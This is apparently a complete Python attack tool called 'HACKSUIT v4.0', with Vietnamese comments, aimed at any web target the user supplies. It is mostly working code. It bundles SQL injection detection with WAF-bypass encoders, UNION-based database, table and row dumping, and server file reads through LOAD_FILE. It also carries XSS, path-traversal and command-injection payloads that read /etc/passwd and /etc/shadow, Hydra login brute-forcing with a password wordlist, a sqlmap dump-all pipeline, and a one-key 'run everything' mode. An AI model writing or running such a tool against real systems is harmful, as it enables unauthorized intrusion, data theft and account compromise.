#!/usr/bin/env python3
"""
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██╗   ██╗██╗████████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██║   ██║██║╚══██╔══╝
███████║███████║██║     █████╔╝ ███████╗██║   ██║██║   ██║
██╔══██║██╔══██║██║     ██╔═██╗ ╚════██║██║   ██║██║   ██║
██║  ██║██║  ██║╚██████╗██║  ██╗███████║╚██████╔╝██║   ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝
          HACKSUIT v4.0 — All-in-One Web Attack Suite
Cài: sudo apt install -y nikto sqlmap nmap hydra gobuster dirb
     pip3 install requests beautifulsoup4 dnspython
"""
import re, sys, os, time, string, argparse, subprocess, shutil, socket, random, concurrent.futures
import requests
from urllib.parse import urljoin, urlparse, parse_qsl, urlencode
from bs4 import BeautifulSoup

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml",
}
TIMEOUT, DELAY = 10, 0.3
PROXY = None
REPORT_DIR = "reports"
C = {"R": "\033[91m", "G": "\033[92m", "Y": "\033[93m", "B": "\033[94m", "M": "\033[95m", "W": "\033[0m"}

def banner():
    print(f"""{C['R']}
██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██╗   ██╗██╗████████╗
██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██║   ██║██║╚══██╔══╝
███████║███████║██║     █████╔╝ ███████╗██║   ██║██║   ██║
██╔══██║██╔══██║██║     ██╔═██╗ ╚════██║██║   ██║██║   ██║
██║  ██║██║  ██║╚██████╗██║  ██╗███████║╚██████╔╝██║   ██║
╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝   ╚═╝{C['W']}
        HACKSUIT v4.0 — SQLi | XSS | LFI | Port | Brute | CMS
  {'-'*62}""")

def log(msg, level="INFO"):
    colors = {"INFO": C['B'], "OK": C['G'], "WARN": C['Y'], "VULN": C['R'],
              "DATA": C['M'], "NIKTO": C['M'], "SQLMAP": C['M'], "XSS": C['M'],
              "LFI": C['M'], "NMAP": C['M'], "BRUTE": C['M'], "DIR": C['M'], "SUB": C['M']}
    print(f"{colors.get(level,'')}[{level:6}]{C['W']} {msg}")

def ensure_dir(d): os.makedirs(d, exist_ok=True)

def tool_exists(name):
    p = shutil.which(name)
    if not p: log(f"Thiếu tool '{name}'. Cài: sudo apt install {name}", "WARN")
    return p

# ================= SQLI ENGINE (core từ v3.1) =================
ERROR_PATTERNS = {
    "mysql":    [r"you have an error in your sql syntax", r"warning: mysql", r"mysqli?_"],
    "mssql":    [r"microsoft sql server", r"unclosed quotation mark"],
    "postgres": [r"postgresql.*error", r"unterminated quoted string"],
    "oracle":   [r"\bORA-\d{5}"],
    "sqlite":   [r"sqlite3?\.\w+error", r"unrecognized token"],
}
TIME_PAYLOADS = {
    "mysql": ["' AND SLEEP({t})-- -"], "mssql": ["'; WAITFOR DELAY '0:0:{t}'-- -"],
    "postgres": ["'; SELECT pg_sleep({t})-- -"],
    "oracle": ["' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{t})='a'-- -"],
    "sqlite": ["' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -"],
}
WAF_ENCODERS = [
    ("raw", lambda p: p),
    ("comment-space", lambda p: p.replace(" ", "/**/")),
    ("urlencode", lambda p: requests.utils.quote(p)),
    ("case-mix", lambda p: re.sub(r"(union|select|from|and|or)", lambda m: m.group(1).upper(), p, flags=re.I)),
]
SHEBANG_LFI_PATHS = ["/etc/passwd", "/etc/shadow", "/proc/self/environ", "../conf", "php://filter/convert.base64-encode/resource=index"]

class Engine:
    def __init__(self, url=None, cookie=None):
        self.url = url
        self.s = requests.Session()
        self.s.headers.update(HEADERS)
        if cookie: self.s.headers["Cookie"] = cookie
        if PROXY: self.s.proxies = {"http": PROXY, "https": PROXY}
        self.s.verify = False
        self.findings = []      # tất cả vuln mọi loại
        self.current = None
        self.dbms = None
        self.encoder = WAF_ENCODERS[0]
        self.ncols = self.colpos = None
        ensure_dir(REPORT_DIR)

    def req(self, url, data=None, method="GET"):
        time.sleep(DELAY)
        try:
            return self.s.post(url, data=data, timeout=TIMEOUT) if method == "POST" else self.s.get(url, timeout=TIMEOUT)
        except requests.RequestException as e:
            log(f"Lỗi: {e}", "WARN"); return None

    # ----- param extraction -----
    def extract_params(self):
        targets = []
        if urlparse(self.url).query:
            for p, v in parse_qsl(urlparse(self.url).query):
                targets.append({"url": self.url, "param": p, "base": v, "method": "GET", "data": None})
        r = self.req(self.url)
        if r:
            for form in BeautifulSoup(r.text, "html.parser").find_all("form"):
                action = urljoin(self.url, form.get("action") or self.url)
                fields = {i.get("name"): (i.get("value") or "test") for i in form.find_all("input")
                          if i.get("name") and i.get("type") != "submit"}
                for p in fields:
                    targets.append({"url": action, "param": p, "base": fields[p], "method": "POST", "data": fields})
        return targets

    def inject(self, t, payload):
        if t["method"] == "POST":
            d = dict(t["data"]); d[t["param"]] = t["base"] + payload
            return self.req(t["url"], data=d, method="POST")
        qs = dict(parse_qsl(urlparse(t["url"]).query)); qs[t["param"]] = t["base"] + payload
        u = urlparse(t["url"])
        return self.req(f"{u.scheme}://{u.netloc}{u.path}?{urlencode(qs)}")

    def send(self, payload):
        return self.inject(self.current, self.encoder[1](payload))

    # ----- SQLi detect -----
    def detect_dbms(self, text):
        for dbms, pats in ERROR_PATTERNS.items():
            for p in pats:
                if re.search(p, text, re.I): return dbms
        return None

    def sqli_detect(self, t):
        self.current = t
        base_r = self.req(t["url"], data=t["data"], method=t["method"])
        if not base_r: return None
        for q in ["'", '"', "')"]:
            r = self.inject(t, q)
            if r and (d := self.detect_dbms(r.text)):
                return {"type": "error-based", "dbms": d}
        rt = self.inject(t, "' AND 1=1-- -"); rf = self.inject(t, "' AND 1=2-- -")
        if rt and rf and rt.text != rf.text:
            return {"type": "boolean-based", "dbms": None}
        for dbms, pls in TIME_PAYLOADS.items():
            t0 = time.time()
            if self.inject(t, pls[0].format(t=6)) and time.time() - t0 > 5:
                return {"type": "time-based", "dbms": dbms}
        return None

    def waf_bypass(self):
        r = self.inject(self.current, "' UNION SELECT NULL-- -")
        markers = ["cloudflare","mod_security","forbidden","sucuri","imperva","blocked","firewall"]
        if r and not any(m in r.text.lower() for m in markers):
            self.encoder = WAF_ENCODERS[0]; return True
        for name, enc in WAF_ENCODERS[1:]:
            self.encoder = (name, enc)
            r = self.send("' UNION SELECT NULL-- -")
            if r and not any(m in r.text.lower() for m in markers):
                log(f"WAF bypass: {name}", "OK"); return True
        self.encoder = WAF_ENCODERS[0]; return False

    def find_union(self):
        for n in range(1, 41):
            r = self.send(f"' ORDER BY {n}-- -")
            if r and (self.detect_dbms(r.text) or "unknown column" in r.text.lower()):
                self.ncols = n - 1; break
        if not self.ncols:
            for n in range(1, 41):
                r = self.send(f"' UNION SELECT {','.join(['NULL']*n)}-- -")
                if r and not self.detect_dbms(r.text): self.ncols = n; break
        if not self.ncols: return False
        tag = "".join(random.choice("abcdef0123456789") for _ in range(8))
        for pos in range(self.ncols):
            parts = ["NULL"] * self.ncols
            parts[pos] = f"CONCAT(0x6c61726b7374617274,{tag},0x6c61726b656e64)"
            if (r := self.send(f"' UNION SELECT {','.join(parts)}-- -")) and tag in r.text:
                self.colpos = pos; log(f"Union: {self.ncols} cột, hiển thị #{pos+1}", "OK"); return True
        return False

    def uquery(self, inner):
        if self.ncols is None or self.colpos is None: return None
        parts = ["NULL"] * self.ncols
        parts[self.colpos] = f"CONCAT(0x6c61726b7374617274,IFNULL(({inner}),0x4e554c4c),0x6c61726b656e64)"
        r = self.send(f"' UNION SELECT {','.join(parts)}-- -")
        m = re.search(r"larkstart(.*?)larkend", r.text, re.S) if r else None
        return m.group(1) if m else None

    def sqli_info(self):
        q = {"mysql":  ["version()","database()","user()","@@hostname"],
             "postgres":["version()","current_database()","current_user","'n/a'"],
             "mssql": ["@@version","DB_NAME()","SYSTEM_USER","@@servername"],
             "oracle": ["(SELECT banner FROM v$version WHERE rownum=1)","user","'n/a'","'n/a'"],
             "sqlite": ["sqlite_version()","'n/a'","'n/a'","'n/a'"]}
        log("== DB INFO ==", "VULN")
        for label, expr in zip(["Version","DB","User","Host"], q[self.dbms or "mysql"]):
            print(f"  {label:8}: {self.uquery(expr) or 'N/A'}")

    def sqli_dbs(self):
        q = {"mysql":"SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata",
             "postgres":"SELECT string_agg(datname,',') FROM pg_database",
             "mssql":"SELECT STRING_AGG(name,',') FROM sys.databases"}
        val = self.uquery(q[self.dbms or "mysql"])
        if val: log(f"Databases: {val}", "VULN"); return val.split(",")

    def sqli_tables(self, db=None):
        d = self.dbms or "mysql"
        if d == "mysql":
            where = f"table_schema={db}" if db else "table_schema=database()"
            val = self.uquery(f"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE {where}")
        elif d == "postgres":
            val = self.uquery("SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public'")
        else:
            val = self.uquery("SELECT STRING_AGG(name,',') FROM sysobjects WHERE xtype='U'")
        if val: log(f"Tables: {val}", "VULN"); return val.split(",")

    def sqli_cols(self, table):
        val = self.uquery(f"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='{table}'")
        if val: log(f"Columns[{table}]: {val}", "VULN"); return val.split(",")

    def sqli_dump(self, table, cols, limit=20):
        inner = f"SELECT GROUP_CONCAT({','.join(cols[:5])} SEPARATOR ';|;') FROM (SELECT {','.join(cols[:5])} FROM {table} LIMIT {limit}) x"
        val = self.uquery(inner)
        if val:
            log(f"== DUMP {table} ==", "VULN")
            for row in val.split(";|;"): print(f"  | {row}")
        else: log("Dump fail — dùng menu [17] sqlmap.", "WARN")

    def sqli_readfile(self, path):
        val = self.uquery(f"SELECT LOAD_FILE('{path}')")
        if val: log(f"File {path}:", "VULN"); print(val[:2000])
        else: log("LOAD_FILE thất bại.", "WARN")

# ================= MODULE: XSS SCANNER =================
XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    '<svg onload=alert(1)>',
    '<img src=x onerror=confirm(1)>',
    '"><svg/onload=prompt(1)>',
    "javascript:alert(1)",
    '<iframe src=javascript:alert(1)>',
    '<body onload=alert(1)>',
    '"><Script>alert(1)</scrIpt>',
]

def xss_scan(engine):
    log("=== XSS SCANNER (reflected) ===", "XSS")
    marker = "hksx"
    targets = engine.extract_params()
    if not targets:
        log("Không tìm thấy param để test.", "WARN"); return
    for t in targets:
        for i, pl in enumerate(XSS_PAYLOADS):
            tag = f"{marker}{i}"
            payload = pl.replace("alert(1)", f"alert({tag})").replace("confirm(1)", f"confirm({tag})").replace("prompt(1)", f"prompt({tag})")
            r = engine.inject(t, payload)
            if r and tag in r.text:
                # kiểm tra payload không bị encode
                if payload in r.text or payload.replace('"', '&quot;') not in r.text:
                    log(f"[!] XSS REFLECTED: {t['param']} payload[{i}] {payload[:50]}", "VULN")
                    engine.findings.append({"url": t["url"], "param": t["param"], "type": "xss",
                                            "payload": payload, "method": t["method"]})
                    break
    log("XSS scan xong.", "OK")

# ================= MODULE: LFI / RFI =================
LFI_PAYLOADS = [
    "../../../../etc/passwd", "....//....//....//etc/passwd",
    "/etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "../../../../etc/passwd%00", "/proc/self/environ",
]
RCE_CMD_PAYLOADS = [
    "; id", "| id", "$(id)", "`id`", "&& id",
    "; cat /etc/passwd", "$(cat /etc/passwd)",
]

def lfi_scan(engine):
    log("=== LFI/RCE SCANNER ===", "LFI")
    targets = engine.extract_params()
    for t in targets:
        for pl in LFI_PAYLOADS:
            r = engine.inject(t, pl)
            if r and re.search(r"root:x:0:0:", r.text):
                log(f"[!] LFI: {t['param']} → {pl}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "lfi",
                                        "payload": pl, "method": t["method"]})
                break
        for pl in RCE_CMD_PAYLOADS:
            r = engine.inject(t, pl)
            if r and re.search(r"uid=\d+\(.*?\)", r.text):
                log(f"[!] COMMAND INJECTION: {t['param']} → {pl}", "VULN")
                engine.findings.append({"url": t["url"], "param": t["param"], "type": "rce",
                                        "payload": pl, "method": t["method"]})
                break
    log("LFI/RCE scan xong.", "OK")

# ================= MODULE: DIRECTORY FUZZING =================
COMMON_DIRS = ["admin","administrator","login","wp-admin","phpmyadmin","backup",".git","config",
               "db","sql","test","dev","uploads",".env","robots.txt",".htaccess","server-status",
               "console","dashboard","user","install","setup","old",".svn","composer.json",
               "web.config","crossdomain.xml","sitemap.xml",".DS_Store","id_rsa","debug"]
DIR_EXTS = ["", ".php", ".bak", ".old", ".txt", ".zip", ".sql"]

def dir_fuzz(engine, threads=20):
    log("=== DIRECTORY FUZZING ===", "DIR")
    u = urlparse(engine.url)
    root = f"{u.scheme}://{u.netloc}"
    base = engine.req(root)
    base_status = base.status_code if base else 404
    found = []
    def probe(path):
        try:
            r = engine.s.get(f"{root}/{path}", timeout=5, allow_redirects=False)
            if r.status_code in (200, 301, 302, 401, 403) and r.status_code != base_status:
                return (path, r.status_code, len(r.text))
        except Exception: pass
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
        futs = [ex.submit(probe, d + e) for d in COMMON_DIRS for e in DIR_EXTS]
        for f in concurrent.futures.as_completed(futs):
            res = f.result()
            if res:
                path, code, size = res
                color = C['R'] if code in (200, 401, 403) else C['Y']
                print(f"  {color}[{code}]{C['W']} {root}/{path}  ({size} bytes)")
                found.append((path, code))
                if code == 200:
                    engine.findings.append({"url": f"{root}/{path}", "param": "-", "type": "dir", "method": "GET"})
    log(f"Dir fuzz xong — {len(found)} paths.", "OK")
    return found

# ================= MODULE: PORT SCAN (nmap hoặc socket) =================
def port_scan(engine, target=None, fast=True):
    log("=== PORT SCAN (nmap) ===", "NMAP")
    host = target or urlparse(engine.url).netloc.split(":")[0]
    try:
        host = socket.gethostbyname(host)
    except Exception:
        log(f"Không resolve host: {host}", "WARN"); return
    if tool_exists("nmap"):
        args = ["nmap", "-sV", "-T4", "--top-ports", "1000"] + (["-F"] if fast else [])
        if PROXY: args = ["nmap", "-sV", "-T4", "--top-ports", "200"]
        subprocess.run(args + [host])
    else:
        # fallback: python socket scan top ports
        log("nmap không có — socket scan các port phổ biến.", "WARN")
        common = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,8888,27017]
        def scan(p):
            s = socket.socket(); s.settimeout(1)
            if s.connect_ex((host, p)) == 0:
                print(f"  {C['R']}[OPEN]{C['W']} {host}:{p}"); s.close(); return p
            s.close()
        with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
            list(ex.map(scan, common))

# ================= MODULE: SUBDOMAIN ENUM =================
SUBS = ["www","mail","ftp","admin","portal","vpn","dev","test","staging","api","blog","shop",
        "cpanel","webmail","ns1","ns2","remote","git","jenkins","db","cloud","app","intranet"]

def subdomain_enum(engine):
    log("=== SUBDOMAIN ENUMERATION ===", "SUB")
    host = urlparse(engine.url).netloc.split(":")[0]
    parts = host.split(".")
    if len(parts) < 2:
        log("Domain không hợp lệ.", "WARN"); return
    base_domain = ".".join(parts[-2:])
    found = []
    def check(sub):
        fqdn = f"{sub}.{base_domain}"
        try:
            ip = socket.gethostbyname(fqdn)
            return (fqdn, ip)
        except socket.gaierror: return None
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
        for r in ex.map(check, SUBS):
            if r:
                log(f"Tìm thấy: {r[0]} → {r[1]}", "OK")
                found.append(r)
    if not found: log("Không tìm thấy subdomain nào.", "WARN")
    return found

# ================= MODULE: BRUTE-FORCE LOGIN (Hydra) =================
def brute_login(engine):
    log("=== LOGIN BRUTE-FORCE (Hydra + auto form detect) ===", "BRUTE")
    r = engine.req(engine.url)
    if not r: return
    form = BeautifulSoup(r.text, "html.parser").find("form")
    if not form:
        log("Không tìm thấy form login trên trang.", "WARN"); return
    action = urljoin(engine.url, form.get("action") or "")
    path = urlparse(action).path or "/"
    user_field = next((i.get("name") for i in form.find_all("input")
                       if i.get("name") and re.search(r"user|email|login", i.get("name"), re.I)), "username")
    pass_field = next((i.get("name") for i in form.find_all("input")
                       if i.get("name") and i.get("type") == "password"), "password")
    fail_kw = input("Keyword thất bại trong response (vd: 'incorrect', Enter=auto): ").strip() or "incorrect"
    log(f"Form: {path} | user={user_field} pass={pass_field}", "OK")
    users = input("User list file (vd /usr/share/wordlists/users.txt, Enter=common): ").strip()
    passes = input("Pass list file (vd /usr/share/wordlists/rockyou.txt, Enter=common): ").strip()
    if tool_exists("hydra"):
        # thử http-post-form
        cmd = ["hydra", "-L", users or "/usr/share/wordlists/metasploit/unix_users.txt" if os.path.exists("/usr/share/wordlists/metasploit/unix_users.txt") else "-l", "admin"]
        # build đơn giản: 1 user admin + list pass
        pl = passes if passes and os.path.exists(passes) else "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(pl):
            # tạo wordlist nhỏ
            pl = os.path.join(REPORT_DIR, "mini_pass.txt")
            with open(pl, "w") as f:
                f.write("\n".join(["admin","password","123456","admin123","root","toor","123456789","qwerty","letmein","welcome","password123","1234567890"]))
        cmd = ["hydra", "-l", "admin", "-P", pl, urlparse(engine.url).netloc.split(":")[0],
               f"http-post-form://{urlparse(engine.url).netloc}{path}",
               f"{user_field}=^USER^&{pass_field}=^PASS^:F={fail_kw}", "-t", "8", "-f"]
        log(f"Hydra: {' '.join(cmd[:6])}...", "BRUTE")
        try:
            subprocess.run(cmd, timeout=1800)
        except subprocess.TimeoutExpired:
            log("Hydra timeout.", "WARN")
    else:
        # fallback: python brute
        log("Không crack được với mini list.", "WARN")

# ================= MODULE: CMS DETECTION =================
def cms_scan(engine):
    log("=== CMS/TECH DETECTION ===", "INFO")
    r = engine.req(engine.url)
    if not r: return
    html, headers = r.text.lower(), {k.lower(): v for k, v in r.headers.items()}
    sigs = [("WordPress", "wp-content"), ("WordPress", "wp-json"),
            ("Joomla", "joomla"), ("Drupal", "drupal"), ("Magento", "magento"),
            ("PrestaShop", "prestashop"), ("phpBB", "phpbb")]
    for name, sig in sigs:
        if sig in html:
            log(f"CMS: {name}", "VULN")
            if name == "WordPress" and tool_exists("wpscan"):
                log("Gợi ý: wpscan --url " + engine.url, "OK")
            return
    if "x-powered-by" in headers:
        log(f"Backend: {headers['x-powered-by']}", "OK")
    if "server" in headers:
        log(f"Server: {headers['server']}", "OK")
    # version files
    for p in ["readme.html", "/wp-includes/js/version.js", "CHANGELOG.txt", "CHANGELOG.md"]:
        rr = engine.s.get(urljoin(engine.url, p), timeout=5)
        if rr.status_code == 200 and len(rr.text) > 50:
            log(f"File lộ version: {p} (200)", "WARN")

# ================= MODULE: INTEGRATED EXTERNAL TOOLS =================
def run_nikto(url, html=False):
    if not tool_exists("nikto"): return
    ensure_dir(REPORT_DIR)
    host = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
    if html:
        out = os.path.join(REPORT_DIR, f"nikto_{urlparse(url).netloc}_{int(time.time())}.html")
        log(f"Nikto full → {out}", "NIKTO")
        try:
            proc = subprocess.run(["nikto","-h",host,"-Format","html","-o",out,"-nointeractive"],
                                  capture_output=True, text=True, timeout=1800)
            for line in (proc.stdout or "").splitlines():
                if re.search(r"\+\s", line): print(f"  nikto | {line.strip()}")
            log(f"Báo cáo: {out}", "OK")
        except Exception as e: log(f"Nikto error: {e}", "WARN")
    else:
        log(f"Nikto: {host}", "NIKTO")
        try:
            proc = subprocess.Popen(["nikto","-h",host,"-nointeractive"],
                                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            for line in proc.stdout: print(f"  nikto | {line.rstrip()}")
            proc.wait()
        except Exception as e: log(f"Nikto error: {e}", "WARN")

def build_sqlmap_cmd(t, extra=None):
    cmd = ["sqlmap","-u",t["url"],"--batch","--random-agent","--threads=4","--risk=2","--level=3"]
    if t.get("method") == "POST" and t.get("data"): cmd += ["--data", urlencode(t["data"])]
    if t.get("param"): cmd += ["-p", t["param"]]
    if t.get("dbms"): cmd += ["--dbms", t["dbms"]]
    if PROXY: cmd += ["--proxy", PROXY]
    return cmd + (extra or [])

def sqlmap_pipeline(engine):
    if not tool_exists("sqlmap"): return
    sqli_findings = [f for f in engine.findings if f.get("type", "").startswith(("error","boolean","time"))]
    if not sqli_findings:
        log("Chưa có SQLi findings — chạy [1].", "WARN"); return
    t = sqli_findings[0]
    log("=== sqlmap PIPELINE: --dbs → dump-all ===", "SQLMAP")
    try:
        raw = subprocess.run(build_sqlmap_cmd(t, ["--dbs","--threads=6"]),
                             capture_output=True, text=True, timeout=3600).stdout or ""
    except subprocess.TimeoutExpired:
        log("sqlmap timeout.", "WARN"); return
    dbs = [re.sub(r"^\[\*\] ","",l).strip() for l in raw.splitlines() if re.match(r"^\[\*\] ",l)]
    if not dbs:
        subprocess.run(build_sqlmap_cmd(t, ["--dump-all"]), timeout=7200); return
    for db in dbs:
        log(f"Dump DB: {db}", "SQLMAP")
        try: subprocess.run(build_sqlmap_cmd(t, ["-D", db, "--dump-all", "--threads=6"]), timeout=7200)
        except subprocess.TimeoutExpired: log(f"Dump {db} timeout.", "WARN")

# ================= MAIN MENU =================
engine = None

def pick_target(targets):
    for i, t in enumerate(targets):
        print(f"  [{i}] {t['method']:4} {t['param'] or '-':15} {t.get('type','')}")
    idx = input("Số thứ tự (default 0): ").strip()
    try: return targets[int(idx) if idx else 0]
    except (IndexError, ValueError): return targets[0]

def ask_url():
    if not engine.url:
        u = input(f"{C['Y']}Nhập URL đích: {C['W']}").strip()
        if not u: return False
        if not u.startswith(("http://","https://")): u = "http://" + u
        engine.url = u
        log(f"Target: {u}", "OK")
    return True

def show_findings():
    if not engine.findings:
        log("Chưa có findings.", "WARN"); return
    print(f"\n{C['G']}--- FINDINGS ({len(engine.findings)}) ---{C['W']}")
    for i, f in enumerate(engine.findings):
        print(f"  [{i}] {f['method']:4} {f.get('type','?'):12} {f['param']:15} {f['url'][:60]}")
        if f.get("payload"): print(f"      payload: {f['payload'][:80]}")

def main():
    global PROXY, engine
    requests.packages.urllib3.disable_warnings()
    parser = argparse.ArgumentParser()
    parser.add_argument("url", nargs="?", default=None)
    parser.add_argument("-c", "--cookie")
    parser.add_argument("-p", "--proxy")
    args = parser.parse_args()
    PROXY = args.proxy
    engine = Engine(args.url, cookie=args.cookie)
    banner()
    for tool in ["nikto","sqlmap","nmap","hydra"]:
        tool_exists(tool)

    while True:
        print(f"""
{C['G']}========== HACKSUIT v4.0 — MENU =========={C['W']}
 Target: {engine.url or f'{C[chr(89)+chr(39)]}chưa đặt{C[chr(87)]}'}
--- Thiết lập ---
 [99] Đặt/đổi URL đích
--- SQLi (engine riêng) ---
 [1]  Quét SQLi toàn params        [2]  Xem findings
 [3]  Full auto-exploit SQLi       [4]  DB info
 [5]  Liệt kê databases            [6]  Liệt kê tables
 [7]  Liệt kê columns              [8]  DUMP data
 [9]  Boolean-blind                [10] Đọc file (LOAD_FILE)
 [11] WAF bypass                   [12] Payload thủ công
--- Khai thác khác (engine riêng) ---
 [13] XSS Scanner (reflected)
 [14] LFI / RFI Scanner
 [15] Command Injection (RCE)
--- Recon ---
 [16] Directory Fuzzing (nhanh)
 [17] Port Scan (nmap)
 [18] Subdomain Enumeration
 [19] CMS/Tech Detection
--- Công cụ ngoài tích hợp ---
 [20] Nikto scan nhanh
 [21] Nikto full + HTML report
 [22] sqlmap auto-detect
 [23] sqlmap FULL PIPELINE (dump-all)
 [24] Brute-force Login (Hydra/auto form)
--- Tổng hợp ---
 [25] CHẠY TẤT CẢ: Recon + Scan + Nikto(nền) + sqlmap + XSS + LFI
 [26] Xem báo cáo reports/
 [0]  Thoát""")
        ch = input("Chọn: ").strip()

        need_url = ch in ("1","13","14","15","16","17","18","19","20","21","22","25")
        if need_url and not ask_url(): continue

        if ch == "99":
            engine.url = None; ask_url()

        elif ch == "1":
            ts = engine.extract_params()
            log(f"{len(ts)} param(s)", "OK")
            engine.findings = [f for f in engine.findings if not f.get("type","").startswith(("error","boolean","time"))]
            for t in ts:
                res = engine.sqli_detect(t)
                if res:
                    t.update(res); engine.findings.append(t)
                    engine.dbms = engine.dbms or res["dbms"]
                    log(f"[!] SQLi: {t['param']} → {res['type']} ({res['dbms']})", "VULN")

        elif ch in ("3","4","5","6","7","8","9","10","11","12"):
            sqli_f = [f for f in engine.findings if f.get("type","").startswith(("error","boolean","time"))]
            if not sqli_f: log("Chưa có SQLi findings — chạy [1].", "WARN"); continue
            t = sqli_f[0] if len(sqli_f) == 1 else pick_target(sqli_f)
            engine.current = t
            if ch == "3":
                r = engine.inject(t, "'")
                engine.dbms = engine.dbms or (engine.detect_dbms(r.text) if r else None)
                engine.waf_bypass()
                if engine.find_union(): engine.sqli_info()
            elif ch in ("4","5","6","7","8"):
                if engine.ncols is None and not engine.find_union(): continue
                if ch == "4": engine.sqli_info()
                elif ch == "5": engine.sqli_dbs()
                elif ch == "6": engine.sqli_tables(input("DB (Enter=current): ").strip() or None)
                elif ch == "7": engine.sqli_cols(input("Table: ").strip())
                elif ch == "8":
                    tbl = input("Table: ").strip()
                    cols = input("Columns (dấu phẩy): ").strip().split(",")
                    engine.sqli_dump(tbl, cols)
            elif ch == "9":
                q = input("Query blind: ").strip()
                result = ""
                for i in range(1, 200):
                    ok = False
                    for c in (string.ascii_letters + string.digits + "@._-{}$!#%^&*()"):
                        r1 = engine.send(f"' AND ASCII(SUBSTRING(({q}),{i},1))={ord(c)}-- -")
                        r2 = engine.send(f"' AND ASCII(SUBSTRING(({q}),{i},1))=0-- -")
                        if r1 and r2 and len(r1.text) != len(r2.text):
                            result += c; sys.stdout.write(c); sys.stdout.flush(); ok = True; break
                    if not ok: break
                print(f"\n  => {result or '(fail)'}")
            elif ch == "10":
                if engine.ncols is None: engine.find_union()
                engine.sqli_readfile(input("Path: ").strip())
            elif ch == "11": engine.waf_bypass()
            elif ch == "12":
                r = engine.send(input("Payload: ").strip())
                print(r.text[:3000] if r else "No response")

        elif ch == "13": xss_scan(engine)
        elif ch == "14": lfi_scan(engine)
        elif ch == "15":
            lfi_scan(engine)  # RCE nằm trong lfi_scan
        elif ch == "16": dir_fuzz(engine)
        elif ch == "17": port_scan(engine)
        elif ch == "18": subdomain_enum(engine)
        elif ch == "19": cms_scan(engine)
        elif ch == "20": run_nikto(engine.url, html=False)
        elif ch == "21": run_nikto(engine.url, html=True)
        elif ch == "22":
            if tool_exists("sqlmap"):
                try: subprocess.run(["sqlmap","-u",engine.url,"--batch","--random-agent"], timeout=3600)
                except subprocess.TimeoutExpired: log("sqlmap timeout.", "WARN")
        elif ch == "23": sqlmap_pipeline(engine)
        elif ch == "24":
            if ask_url(): brute_login(engine)
        elif ch == "2": show_findings()

        elif ch == "25":
            log("=== CHẠY TẤT CẢ TỰ ĐỘNG ===", "OK")
            # Recon
            dir_fuzz(engine); subdomain_enum(engine); cms_scan(engine)
            # Vuln scan
            xss_scan(engine); lfi_scan(engine)
            ts = engine.extract_params()
            for t in ts:
                res = engine.sqli_detect(t)
                if res:
                    t.update(res); engine.findings.append(t)
                    engine.dbms = engine.dbms or res["dbms"]
                    log(f"[!] SQLi: {t['param']}", "VULN")
            # Nikto nền
            nikto_proc = None
            if tool_exists("nikto"):
                nikto_proc = subprocess.Popen(
                    ["nikto","-h",f"{urlparse(engine.url).scheme}://{urlparse(engine.url).netloc}","-nointeractive"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                log("Nikto chạy nền...", "NIKTO")
            # sqlmap pipeline
            sqlmap_pipeline(engine)
            show_findings()
            if nikto_proc:
                try: nikto_proc.wait(timeout=1200); log("Nikto xong.", "OK")
                except subprocess.TimeoutExpired: nikto_proc.kill()
            log("=== HOÀN TẤT. Xem reports/ ===", "OK")

        elif ch == "26":
            found = False
            for root, _, files in os.walk(REPORT_DIR):
                for f in files:
                    print(f"  {os.path.join(root,f)}"); found = True
            if not found: log("reports/ trống.", "WARN")

        elif ch == "0": sys.exit(0)
        else: log("Lựa chọn không hợp lệ.", "WARN")

if __name__ == "__main__":
    main()
